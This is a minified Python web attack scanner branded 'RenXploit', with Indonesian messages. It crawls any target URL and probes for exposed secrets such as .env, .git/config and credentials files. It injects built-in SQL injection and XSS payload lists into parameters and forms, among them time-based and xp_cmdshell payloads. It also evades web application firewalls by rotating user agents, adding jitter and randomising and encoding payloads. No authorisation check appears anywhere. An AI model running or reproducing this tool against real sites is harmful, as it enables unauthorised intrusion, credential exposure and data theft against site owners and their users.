#!/usr/bin/env python3
_p=' (form)'
_o='textarea'
_n='User-Agent'
_m='akamai'
_l='incapsula'
_k='modsecurity'
_j='sucuri'
_i='cloudflare'
_h='bypass'
_g='params'
_f='warning'
_e='confidence'
_d='bypass_type'
_c='payload'
_b='target'
_a='value'
_Z='timings'
_Y='inputs'
_X='fingerprint'
_W='security_headers'
_V='links'
_U=False
_T='reset'
_S='critical'
_R='method'
_Q='action'
_P='waf'
_O='sensitive_paths'
_N='forms'
_M='vulnerable'
_L='error'
_K='get'
_J='='
_I='name'
_H='type'
_G=None
_F='info'
_E=True
_D='success'
_C='xss'
_B='sqli'
_A='vulnerabilities'
import re,time,random,argparse,json,threading,html,os
from urllib.parse import urlparse,urljoin,quote
from collections import deque,defaultdict
from concurrent.futures import ThreadPoolExecutor,as_completed
import httpx
from bs4 import BeautifulSoup
import tldextract
from fake_useragent import UserAgent
from colorama import Fore,Style,init
init(autoreset=_E)
UA=UserAgent()
COLORS={_F:Fore.CYAN,_D:Fore.GREEN,_f:Fore.YELLOW,_L:Fore.RED,_S:Fore.MAGENTA,_M:Fore.RED+Style.BRIGHT,_h:Fore.BLUE+Style.BRIGHT,_T:Style.RESET_ALL}
SQLI_BASE_PAYLOADS=["' OR 1=1--",'" OR 1=1--',"' OR '1'='1",'" OR "1"="1',"admin'--","admin' #","'; WAITFOR DELAY '0:0:5'--","' OR SLEEP(5)--","' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' OR 'x'='x","') OR ('a'='a","')) OR (('a'='a","' OR 1=1 LIMIT 1--",'" OR 1=1 LIMIT 1--',"' OR 'a'='a'#","1' ORDER BY 1--","1' ORDER BY 99--","' AND 1=1--","' AND (SELECT 1 FROM some_table)='1","'/**/OR/**/1=1--","'+OR+1=1--",'oR 1=1--',"' uNIoN sEleCt 1,2,3--","admin' AND 1=1--","' OR 1=CAST(CONCAT(CHAR(83),CHAR(81),CHAR(76)) AS SIGNED)--","'; EXEC xp_cmdshell('ping 127.0.0.1')--","' AND IF(1=1,SLEEP(5),0)--",'%27 OR 1=1--',"' OR TRUE--"]
XSS_BASE_PAYLOADS=["<script>alert('XSS')</script>","'><script>alert('XSS')</script>","<img src=x onerror=alert('XSS')>",'"><svg/onload=alert(\'XSS\')>',"<body onload=alert('XSS')>",'<iframe src="javascript:alert(\'XSS\');"></iframe>','<a href="javascript:alert(\'XSS\')">Click me</a>',"<details open ontoggle=alert('XSS')>","<ScRiPt>alert('XSS')</sCrIpT>",'<img src="x:x" onerror="alert(String.fromCharCode(88,83,83))">','<svg><script>alert(1)</script></svg>',"javascript:alert('XSS')",'<object data="javascript:alert(\'XSS\')"></object>',"<input onfocus=alert('XSS') autofocus>",'<div style="width:100px;height:100px;" onmouseover=alert(\'XSS\')></div>',"<video src=x onerror=alert('XSS')></video>","';alert('XSS');//","`<script>alert('XSS')</script>`","&lt;script&gt;alert('XSS')&lt;/script&gt;","%3Cscript%3Ealert('XSS')%3C/script%3E",'<style>@import \'javascript:alert("XSS")\';</style>',"<marquee onstart=alert('XSS')>",'<form action="javascript:alert(\'XSS\')"><input type=submit></form>','']
COMMON_PATHS=['admin/','login/','dashboard/','admin.php','login.php','wp-admin/','robots.txt','.env','.git/config','config.php','backup.zip','test.php','administrator/','admin-panel/','cpanel/','phpmyadmin/','web.config','settings.php','phpinfo.php','access.log','error.log','database.yml','backup.sql','site.tar.gz','www.zip','api/','vendor/','composer.json','package.json','/.svn/entries','uploads/','shell.php','adm/','admin.html','login.html','user/','account/','member/','portal/','admin_area/','admin_login/','backend/','client-login/','webadmin/','manage/','.htaccess','.htpasswd','wp-config.php','configuration.php','config.inc.php','config.json','settings.json','credentials.json','secrets.yml','env.php','app/etc/local.xml','parameters.yml','db.php','local.properties','nginx.conf','backup/','backups/','_backup/','dump.sql','database.sql','db.zip','db.tar.gz','site.rar','data.zip','archive.zip','backup.bak','dump.sql.gz','backup.tar','index.bak','index.old','logs/','log.txt','debug.log','system.log','install.log','error.txt','server-status','info.php','CHANGELOG.txt','README.md','assets/','includes/','scripts/','tmp/','temp/','files/','media/','download.php','upload.php','/.idea/','/.vscode/','/.DS_Store','xmlrpc.php','v1/','v2/']
SECURITY_HEADERS=['Content-Security-Policy','Strict-Transport-Security','X-Content-Type-Options','X-Frame-Options','Referrer-Policy','Permissions-Policy']
WAF_SIGNATURES={_i:[_i],_j:[_j,'sucuri firewall'],_k:['mod_security',_k],_l:[_l],_m:[_m]}
def randomize_case(s):return''.join(A.upper()if random.choice([_E,_U])else A.lower()for A in s)
def encode_variants(payload):B=payload;A=set();A.add(B);A.add(quote(B));A.add(randomize_case(B));A.add(html.escape(B));A.add(B.replace("'","'/*x*/'"));return list(A)
def banner():print(f"""{COLORS[_S]}
██████╗ ███████╗███████╗██████╗  █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
██║  ██║█████╗  █████╗  ██████╔╝███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██║  ██║██╔══╝  ██╔══╝  ██╔══██╗██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██████╔╝███████╗███████╗██║  ██║██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
{COLORS[_T]}{COLORS[_f]}v3.0 | UltraScanner Suite | RenXploit ~ ngoprek.xyz Project{COLORS[_T]}
""")
class WebScannerSuite:
	def __init__(A,start_url,max_depth=2,delay=.5,threads=8,args=_G):B=start_url;A.start_url=A._normalize_url(B,B);A.base_domain=tldextract.extract(B).registered_domain;A.max_depth=max_depth;A.delay=delay;A.threads=threads;A.args=args;A.session=httpx.Client(follow_redirects=_E,headers={_n:UA.random},timeout=1e1);A.lock=threading.Lock();A.queue=deque([(A.start_url,0)]);A.visited=set();A.param_cache=set();A.results={_V:set(),_N:[],_g:set(),_O:set(),_W:{},_P:set(),_X:{},_A:{_B:[],_C:[]},_Z:defaultdict(list),'adaptive':{}}
	def _is_same_domain(A,url):
		try:return tldextract.extract(url).registered_domain==A.base_domain
		except:return _U
	def _normalize_url(B,url,base_url):A=urljoin(base_url,url);return A.split('#')[0].rstrip('/')
	def _fetch(A,url,method=_K,params=_G,data=_G,extra_headers=_G):
		'Fetch terpusat dengan adaptive bypass (user-agent rotate + jitter).';E=extra_headers;D=params;C=url;time.sleep(A.delay*random.uniform(.8,1.3));B={}
		if E:B.update(E)
		B[_n]=UA.random
		try:
			if method.lower()==_K:F=A.session.get(C,params=D,headers=B)
			else:F=A.session.post(C,data=data,params=D,headers=B)
			return F
		except httpx.RequestError as G:
			with A.lock:print(f"{COLORS[_L]}[-] Request error ke {C}: {G}")
			return
	def fingerprint_waf(B,response):
		'Deteksi WAF sederhana dari header atau body.';D='x-powered-by';C='server';A=response;F=A.text.lower()if A and A.text else''
		for(G,H)in WAF_SIGNATURES.items():
			for E in H:
				if E in(A.headers.get(C,'').lower()or'')or E in F:B.results[_P].add(G)
		B.results[_X][C]=A.headers.get(C,'unknown')
		if D in A.headers:B.results[_X][D]=A.headers.get(D)
	def scan_security_headers(A):
		print(f"\n{COLORS[_F]}[*] Memulai pemindaian Security Header...");B=A._fetch(A.start_url)
		if not B:return
		A.fingerprint_waf(B);D={A.lower():B.headers.get(A,'')for A in B.headers}
		for C in SECURITY_HEADERS:E=C.lower()in D and D.get(C.lower(),'');A.results[_W][C]=bool(E),D.get(C.lower(),'Tidak ditemukan')
		print(f"{COLORS[_D]}[+] Security Header selesai.")
	def scan_directories(A):
		print(f"\n{COLORS[_F]}[*] Memulai pemindaian Direktori & File Sensitif (paralel)...");E=[]
		def B(path):
			B=urljoin(A.start_url+'/',path)
			try:
				C=A.session.head(B,timeout=5.)
				if C.status_code!=404:
					with A.lock:print(f"{COLORS[_D]}[FOUND] {B} (Status: {C.status_code})");A.results[_O].add(f"{B} [{C.status_code}]")
			except Exception:pass
		with ThreadPoolExecutor(max_workers=min(A.threads,len(COMMON_PATHS)))as C:
			D=[C.submit(B,A)for A in COMMON_PATHS]
			for F in as_completed(D):continue
		print(f"{COLORS[_D]}[+] Direktori/file sensitif selesai.")
	def _extract_content(A,soup,base_url):
		Q='img';P='script';D=base_url;C=soup;E=set()
		for K in C.find_all(['a','link',P,Q],href=_E)+C.find_all(['iframe','frame',P,Q],src=_E):
			F=K.get('href')or K.get('src')
			if F and not F.startswith(('javascript:','mailto:','tel:')):
				L=A._normalize_url(F,D)
				if A._is_same_domain(L):E.add(L)
		A.results[_V].update(E);M=[]
		for G in C.find_all('form'):
			H=A._normalize_url(G.get(_Q,''),D);I=G.get(_R,_K).lower();B=[]
			for J in G.find_all(['input',_o,'select']):R=J.get(_H,'text');B.append({_H:R,_I:J.get(_I),_a:J.get(_a,'')})
			M.append({_Q:H,_R:I,_Y:B})
			if{_Q:H,_R:I,_Y:B}not in A.results[_N]:A.results[_N].append({_Q:H,_R:I,_Y:B})
		N=urlparse(D)
		if N.query:
			for O in N.query.split('&'):
				if _J in O:A.results[_g].add(O.split(_J)[0])
		return E,M
	def scan_sqli(A,url,method=_K,form_inputs=_G):
		J=method;F=form_inputs;B=url;C=time.time();D=f"{B} [{J.upper()}]"
		if F:D+=_p
		H=bool(A.results[_P]);K=set()
		def E(p):
			if p in K:return
			K.add(p);P=encode_variants(p)
			for D in P:
				H=D
				if F:
					I={}
					for E in F:
						if not E.get(_I):continue
						if E[_H]in['submit','button']:I[E[_I]]=E.get(_a,'')
						else:I[E[_I]]=D
					G=A._fetch(B,method=J,data=I)
				elif'?'in B:
					Q=urlparse(B);R=Q.query
					for L in R.split('&'):
						if _J not in L:continue
						M=L.split(_J)[0];S=B.replace(f"{M}=",f"{M}={quote(D)}");G=A._fetch(S);break
				else:continue
				if not G:continue
				N=G.text.lower();T=['you have an error in your sql syntax','warning: mysql','unclosed quotation mark','syntax error','mysql_fetch','pdoexception','sql syntax','mysql num_rows']
				if any(A in N for A in T):
					C={_b:B,_H:'error-based',_c:H,'context':F or'url-param',_d:'obfuscated'if D!=p else'raw',_e:'high'}
					with A.lock:print(f"{COLORS[_M]}[SQLi ERROR-BASED] {C}");A.results[_A][_B].append(C);return _E
				if'sleep'in D.lower()or'delay'in D.lower():
					O=G.elapsed.total_seconds()
					if O>=4:
						C={_b:B,_H:'time-based',_c:H,'measured_delay':O,_d:'delay-injection',_e:'medium-high'}
						with A.lock:print(f"{COLORS[_M]}[SQLi TIME-BASED] {C}");A.results[_A][_B].append(C);return _E
				if'union select'in D.lower():
					if'union'in N:
						C={_b:B,_H:'union-based',_c:H,_d:'union-injection',_e:'medium'}
						with A.lock:print(f"{COLORS[_M]}[SQLi UNION] {C}");A.results[_A][_B].append(C);return _E
			return _U
		for G in SQLI_BASE_PAYLOADS:
			if E(G):break
		A.results[_Z][_B].append(time.time()-C)
	def scan_xss(A,url,method=_K,form_inputs=_G):
		H=method;E=form_inputs;B=url;C=time.time();D=f"{B} [{H.upper()}]"
		if E:D+=_p
		def F(p):
			J=encode_variants(p)
			for C in J:
				if E:
					F={}
					for D in E:
						if not D.get(_I):continue
						if D[_H]in['text','search','url','email',_o]:F[D[_I]]=C
						else:F[D[_I]]=D.get(_a,'')
					G=A._fetch(B,method=H,data=F)
				elif'?'in B:K=B+quote(C);G=A._fetch(K)
				else:continue
				if not G:continue
				if C in G.text:
					I={_b:B,_H:'reflected',_c:C,_d:'encoded'if C!=p else'raw',_e:'high'}
					with A.lock:print(f"{COLORS[_M]}[XSS REFLECTED] {I}");A.results[_A][_C].append(I);return _E
			return _U
		for G in XSS_BASE_PAYLOADS:
			if F(G):break
		A.results[_Z][_C].append(time.time()-C)
	def crawl(A):
		print(f"\n{COLORS[_F]}[*] Memulai crawling: {A.start_url}");A.queue=deque([(A.start_url,0)]);A.visited=set()
		while A.queue:
			B,F=A.queue.popleft()
			if B in A.visited or F>A.max_depth:continue
			print(f"{COLORS[_D]}[CRAWL] {B} (Depth {F})");E=A._fetch(B)
			if not E or E.status_code!=200:continue
			A.visited.add(B);A.fingerprint_waf(E);N=BeautifulSoup(E.text,'html.parser');O,P=A._extract_content(N,B);D=[]
			if A.args.full_scan or A.args.scan_sqli or A.args.scan_xss:
				if'?'in B:
					if A.args.scan_sqli:D.append((_B,B,_K,_G))
					if A.args.scan_xss:D.append((_C,B,_K,_G))
				for C in P:
					if A.args.scan_sqli:D.append((_B,C[_Q],C[_R],C[_Y]))
					if A.args.scan_xss:D.append((_C,C[_Q],C[_R],C[_Y]))
			with ThreadPoolExecutor(max_workers=A.threads)as I:
				G=[]
				for(J,K,L,M)in D:
					if J==_B:G.append(I.submit(A.scan_sqli,K,L,M))
					elif J==_C:G.append(I.submit(A.scan_xss,K,L,M))
				for Q in as_completed(G):0
			for H in O:
				if H not in A.visited and H not in[A[0]for A in A.queue]:A.queue.append((H,F+1))
	def generate_html_report(B,filename='report.html'):
		F=filename;C='</ul></div>';G=time.strftime('%Y-%m-%d %H:%M:%S');A=[f"<html><head><title>Scan Report {B.start_url}</title><meta charset='utf-8'/><style>body{{font-family:system-ui;background:#0f0f17;color:#e8e8e8;padding:20px;}} .card{{background:#1f1f35;border-radius:12px;padding:15px;margin:10px 0;box-shadow:0 10px 30px rgba(0,0,0,0.4);}} h1{{color:#f0a500;}} .vuln{{color:#ff6b6b;}} .good{{color:#51cf66;}}</style></head><body>"];A.append(f"<h1>Scan Report - {B.start_url}</h1><small>Generated: {G}</small>");A.append("<div class='card'><h2>Summary</h2>");A.append(f"<p>Total URL visited: {len(B.visited)}</p>");A.append(f"<p>WAF Detected: {', '.join(B.results[_P])or'None'}</p>");A.append(f"<p>Security Headers:</p><ul>")
		for(H,(I,J))in B.results[_W].items():K='✅'if I else'❌';A.append(f"<li>{H}: {K} ({J})</li>")
		A.append(C);A.append("<div class='card'><h2>Vulnerabilities</h2>")
		if B.results[_A][_B]:
			A.append("<div class='vuln'><h3>SQLi</h3><ul>")
			for D in B.results[_A][_B]:A.append(f"<li>{json.dumps(D)}</li>")
			A.append(C)
		if B.results[_A][_C]:
			A.append("<div class='vuln'><h3>XSS</h3><ul>")
			for D in B.results[_A][_C]:A.append(f"<li>{json.dumps(D)}</li>")
			A.append(C)
		if not B.results[_A][_B]and not B.results[_A][_C]:A.append("<p class='good'>No SQLi/XSS detected.</p>")
		A.append('</div>');A.append("<div class='card'><h2>Crawled Links & Forms</h2>");A.append(f"<p>Links discovered: {len(B.results[_V])}</p><ul>")
		for L in sorted(B.results[_V]):A.append(f"<li>{L}</li>")
		A.append('</ul>');A.append(f"<p>Forms found: {len(B.results[_N])}</p><ul>")
		for E in B.results[_N]:A.append(f"<li>{html.escape(str(E))}</li>")
		A.append(C)
		if B.results[_O]:
			A.append("<div class='card'><h2>Sensitive Paths</h2><ul>")
			for M in sorted(B.results[_O]):A.append(f"<li>{M}</li>")
			A.append(C)
		A.append('</body></html>')
		try:
			with open(F,'w',encoding='utf-8')as E:E.write('\n'.join(A))
			print(f"{COLORS[_D]}[+] HTML report disimpan ke {F}")
		except Exception as N:print(f"{COLORS[_L]}[-] Gagal simpan HTML report: {N}")
	def save_json(B,filename='report.json'):
		A=filename
		try:
			with open(A,'w',encoding='utf-8')as C:json.dump(B.results,C,indent=2,ensure_ascii=_U)
			print(f"{COLORS[_D]}[+] JSON report disimpan ke {A}")
		except Exception as D:print(f"{COLORS[_L]}[-] Gagal simpan JSON: {D}")
	def generate_console_report(A):
		print(f"\n{COLORS[_D]}{_J*60}");print(f"{'LAPORAN AKHIR PEMINDAIAN':^60}");print(f"{_J*60}{COLORS[_T]}")
		if A.results[_A][_B]or A.results[_A][_C]:
			print(f"\n{COLORS[_M]}[!!!] DITEMUKAN POTENSI KERENTANAN [!!!]")
			if A.results[_A][_B]:
				print(f"\n  {COLORS[_S]}[ SQL INJECTION ]")
				for C in A.results[_A][_B]:print(f"  - {C}")
			if A.results[_A][_C]:
				print(f"\n  {COLORS[_S]}[ CROSS-SITE SCRIPTING (XSS) ]")
				for C in A.results[_A][_C]:print(f"  - {C}")
		else:print(f"\n{COLORS[_D]}[+] Tidak ditemukan SQLi atau XSS.")
		if A.results[_O]:
			print(f"\n{COLORS[_f]}[ DIREKTORI & FILE SENSITIF DITEMUKAN ]")
			for E in sorted(A.results[_O]):print(f" - {E}")
		if A.results[_W]:
			print(f"\n{COLORS[_F]}[ ANALISIS SECURITY HEADER ]")
			for(F,(G,H))in A.results[_W].items():I=f"{COLORS[_D]}Ditemukan"if G else f"{COLORS[_L]}Hilang";print(f" - {F:<25}: {I} - {H}")
		if A.results[_P]:print(f"\n{COLORS[_h]}[ WAF / Proteksi Terdeteksi ]: {', '.join(A.results[_P])}")
		if A.results[_X]:
			print(f"\n{COLORS[_F]}[ FINGERPRINT ]")
			for(D,B)in A.results[_X].items():print(f" - {D}: {B}")
		print(f"\n{COLORS[_F]}[ HASIL CRAWLING ]");print(f" - Total URL Dikunjungi: {len(A.visited)}");print(f" - Total Link Ditemukan: {len(A.results[_V])}");print(f" - Total Form Ditemukan: {len(A.results[_N])}");print(f" - Total Parameter Unik: {len(A.results[_g])}");print(f"\n{COLORS[_F]}[ TIMING ]")
		for(D,B)in A.results[_Z].items():J=sum(B)/len(B)if B else 0;print(f" - {D}: panggilan={len(B)} rata-rata delay={J:.2f}s")
		print(f"\n{COLORS[_D]}{_J*60}");print(f"{'PEMINDAIAN SELESAI':^60}");print(f"{_J*60}{COLORS[_T]}")
	def run(A):
		if A.args.scan_headers or A.args.full_scan:A.scan_security_headers()
		if A.args.scan_dirs or A.args.full_scan:A.scan_directories()
		if A.args.depth>-1:A.crawl()
		A.generate_console_report()
		if A.args.output:B=os.path.splitext(A.args.output)[0];A.save_json(f"{B}.json");A.generate_html_report(f"{B}.html")
def parse_args():C='store_true';A=argparse.ArgumentParser(description='UltraScanner Pro - Next Gen Web Security Suite',formatter_class=argparse.RawTextHelpFormatter);A.add_argument('url',help='Target URL');A.add_argument('-d','--depth',type=int,default=2,help='Kedalaman crawling');A.add_argument('-D','--delay',type=float,default=.5,help='Delay dasar antar request');A.add_argument('-t','--threads',type=int,default=6,help='Jumlah thread paralel');A.add_argument('-o','--output',type=str,help='Prefix output file (misal: hasil_scan)');B=A.add_argument_group('Modul Pemindaian');B.add_argument('--scan-sqli',action=C,help='Scan SQLi');B.add_argument('--scan-xss',action=C,help='Scan XSS');B.add_argument('--scan-dirs',action=C,help='Scan direktori sensitif');B.add_argument('--scan-headers',action=C,help='Scan security headers');B.add_argument('--full-scan',action=C,help='Enable semua modul');return A.parse_args()
if __name__=='__main__':
	banner();args=parse_args()
	if args.full_scan:args.scan_sqli=args.scan_xss=args.scan_dirs=args.scan_headers=_E
	scanner=WebScannerSuite(start_url=args.url,max_depth=args.depth,delay=args.delay,threads=args.threads,args=args)
	try:scanner.run()
	except KeyboardInterrupt:
		print(f"\n{COLORS[_L]}[!] Diinterupsi! Generate laporan parsial...");scanner.generate_console_report()
		if args.output:scanner.save_json(f"{os.path.splitext(args.output)[0]}.json");scanner.generate_html_report(f"{os.path.splitext(args.output)[0]}.html")
	except Exception as e:
		print(f"{COLORS[_S]}[!!!] Error fatal: {e}");scanner.generate_console_report()
		if args.output:scanner.save_json(f"{os.path.splitext(args.output)[0]}.json");scanner.generate_html_report(f"{os.path.splitext(args.output)[0]}.html")
